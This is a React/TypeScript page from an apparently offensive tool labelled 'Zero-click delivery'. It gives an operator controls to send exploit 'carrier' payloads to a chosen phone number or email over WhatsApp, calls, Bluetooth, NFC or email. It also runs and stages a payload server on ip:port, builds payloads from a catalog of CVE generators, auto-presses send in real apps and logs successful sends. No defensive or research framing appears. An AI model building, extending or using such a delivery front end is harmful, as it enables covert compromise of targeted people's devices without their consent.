import { useMemo, useState } from "react";
import { CloudUpload, Link2, Play, Radio, Server, Sparkles } from "lucide-react";
import { api, useApi } from "@/lib/api";
import { Badge, Button, Empty, PageHeader, Panel, Stat } from "@/components/ui";
import { useApp } from "@/state/AppContext";

interface Channel {
  key: string;
  label: string;
  kind: string;
  mime: string;
  note: string;
  needs_target: boolean;
}

interface Vector {
  key: string;
  cve: string;
  title: string;
  category: string;
  recommended_channels: string[];
}

interface HistoryEvent {
  at: string;
  label: string;
  target: string;
  url: string;
}

const isAudio = (channel?: Channel) => channel?.mime === "audio/*";

export default function Delivery() {
  const { activeSerial, devices } = useApp();
  const [channelKey, setChannelKey] = useState("whatsapp");
  const [target, setTarget] = useState("");
  const [url, setUrl] = useState("");
  const [autoSend, setAutoSend] = useState(true);
  const [output, setOutput] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("");

  const channels = useApi<{ channels: Channel[]; server: { running: boolean; url: string | null } }>("/delivery/channels", { interval: 20000 });
  const catalog = useApi<{ vectors: Vector[]; categories: string[] }>(`/catalog?search=${encodeURIComponent(search)}&category=${encodeURIComponent(category)}`, { interval: 60000, deps: [search, category] });
  const history = useApi<{ events: HistoryEvent[] }>("/delivery/history", { interval: 15000 });

  const channel = useMemo(() => channels.data?.channels.find((item) => item.key === channelKey), [channels.data, channelKey]);
  const server = channels.data?.server;

  const run = async (task: () => Promise<unknown>, label: string) => {
    setBusy(true);
    setOutput(label + "…");
    try {
      const result = await task();
      setOutput(JSON.stringify(result, null, 2));
      channels.refresh();
      history.refresh();
    } catch (err) {
      setOutput("error: " + (err instanceof Error ? err.message : String(err)));
    } finally {
      setBusy(false);
    }
  };

  const deploy = () =>
    run(
      () =>
        api.post("/delivery/send", {
          channel: channelKey,
          target,
          url,
          serial: activeSerial,
          auto_send: autoSend,
        }),
      "deploying via " + (channel?.label ?? channelKey),
    );

  const toggleServer = () =>
    run(async () => {
      if (server?.running) return api.del("/delivery/serve");
      const result = await api.post<{ url: string }>("/delivery/serve", { port: 8080 });
      setUrl(result.url);
      return result;
    }, "toggling payload server");

  const stage = async () => {
    const path = window.prompt("Absolute path to the payload file");
    if (!path) return;
    run(async () => {
      const result = await api.post<{ url: string }>("/delivery/stage", { path, port: 8080 });
      setUrl(result.url);
      return result;
    }, "staging file");
  };

  const audio = () => run(() => api.post("/delivery/audio", { url }), "rendering spoken transcript");

  return (
    <div className="page">
      <PageHeader
        title="Zero-click delivery"
        subtitle="Carrier handoff over messaging, calling, Bluetooth, NFC and email — plus the ip:port payload server"
        actions={
          <Button variant={server?.running ? "danger" : "ghost"} onClick={() => void toggleServer()} disabled={busy}>
            <Server size={13} /> {server?.running ? "Stop server" : "Start server"}
          </Button>
        }
      />

      <div className="stat-grid">
        <Stat value={channels.data?.channels.length ?? "—"} label="Delivery channels" tone="info" />
        <Stat value={server?.running ? "LIVE" : "IDLE"} label="Payload server" hint={server?.url ?? "start to get ip:port"} tone={server?.running ? "ok" : "warn"} />
        <Stat value={catalog.data?.vectors.length ?? "—"} label="Carrier payloads" hint="CVE generators on this host" />
        <Stat value={history.data?.events.length ?? 0} label="Recent sends" tone="ok" />
      </div>

      <Panel title="Deploy a carrier">
        <div className="grid-3">
          <div>
            <div className="field-label">Channel</div>
            <select className="select" value={channelKey} onChange={(event) => setChannelKey(event.target.value)}>
              {(channels.data?.channels ?? []).map((item) => (
                <option key={item.key} value={item.key}>{item.label}</option>
              ))}
            </select>
          </div>
          <div>
            <div className="field-label">Device</div>
            <select className="select" value={activeSerial ?? ""} onChange={(event) => event.target.value}>
              {devices.length === 0 && <option value="">no device</option>}
              {devices.map((device) => <option key={device.serial} value={device.serial}>{device.label || device.model || device.serial}</option>)}
            </select>
          </div>
          <div>
            <div className="field-label">Recipient</div>
            <input className="input" value={target} onChange={(event) => setTarget(event.target.value)} placeholder="+1555… / jid / email" />
          </div>
          <div style={{ gridColumn: "span 2" }}>
            <div className="field-label">Payload URL</div>
            <input className="input" value={url} onChange={(event) => setUrl(event.target.value)} placeholder="http://192.168.1.10:8080/payload.apk" />
          </div>
          <div>
            <div className="field-label">Options</div>
            <label className="row tiny" style={{ gap: 6 }}>
              <input type="checkbox" checked={autoSend} onChange={(event) => setAutoSend(event.target.checked)} /> auto-press send
            </label>
          </div>
        </div>
        {channel?.note ? <p className="tiny mute" style={{ marginTop: 8 }}>{channel.note}</p> : null}
        <div className="row" style={{ marginTop: 10, gap: 8 }}>
          <Button onClick={() => void deploy()} disabled={busy || !url}><Radio size={13} /> Deploy</Button>
          <Button variant="ghost" onClick={() => void stage()} disabled={busy}><CloudUpload size={13} /> Stage file…</Button>
          {isAudio(channel) ? <Button variant="ghost" onClick={() => void audio()} disabled={busy}><Sparkles size={13} /> Preview transcript</Button> : null}
        </div>
        {isAudio(channel) ? <p className="tiny mute">Spoken transcript: <span className="mono">{url ? url.replace(/[/.:]/g, " ") : "—"}</span></p> : null}
        {output ? <pre className="terminal" style={{ marginTop: 12, maxHeight: 220 }}>{output}</pre> : null}
      </Panel>

      <div className="grid-2">
        <Panel title="Carrier catalog">
          <div className="row" style={{ gap: 8, marginBottom: 10 }}>
            <input className="input" placeholder="search CVE or title" value={search} onChange={(event) => setSearch(event.target.value)} />
            <select className="select" style={{ width: 150 }} value={category} onChange={(event) => setCategory(event.target.value)}>
              <option value="">all categories</option>
              {(catalog.data?.categories ?? []).map((item) => <option key={item} value={item}>{item}</option>)}
            </select>
          </div>
          <div style={{ maxHeight: 360, overflow: "auto" }}>
            {(catalog.data?.vectors ?? []).map((vector) => (
              <div key={vector.key} className="row" style={{ justifyContent: "space-between", borderBottom: "1px solid var(--line-soft)", padding: "7px 0" }}>
                <div>
                  <div className="mono tiny">{vector.cve}</div>
                  <div className="tiny mute">{vector.title}</div>
                  <div className="tiny mute">{vector.category} → {vector.recommended_channels.join(", ")}</div>
                </div>
                <Button size="sm" variant="ghost" disabled={busy} onClick={() => void run(async () => {
                  const result = await api.post<{ url: string }>("/catalog/build", { key: vector.key, stage: true });
                  setUrl(result.url);
                  return result;
                }, "building " + vector.cve)}>
                  <Play size={11} /> build
                </Button>
              </div>
            ))}
            {catalog.data && catalog.data.vectors.length === 0 ? <Empty title="No carriers match" /> : null}
          </div>
        </Panel>

        <Panel title="Delivery history">
          {(history.data?.events ?? []).length === 0 ? <Empty title="Nothing sent yet" detail="Successful handoffs appear here." /> : (
            <table className="table">
              <thead><tr><th>Channel</th><th>Target</th><th>URL</th><th>Time</th></tr></thead>
              <tbody>
                {(history.data?.events ?? []).map((event, index) => (
                  <tr key={index}>
                    <td><Badge tone="info">{event.label}</Badge></td>
                    <td className="mono tiny">{event.target || "—"}</td>
                    <td className="mono tiny td-truncate" style={{ maxWidth: 180 }}>{event.url}</td>
                    <td className="tiny mute">{event.at.slice(11, 19)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
          <div className="row tiny mute" style={{ marginTop: 8 }}><Link2 size={11} /> Channel intents target the real packages.</div>
        </Panel>
      </div>
    </div>
  );
}
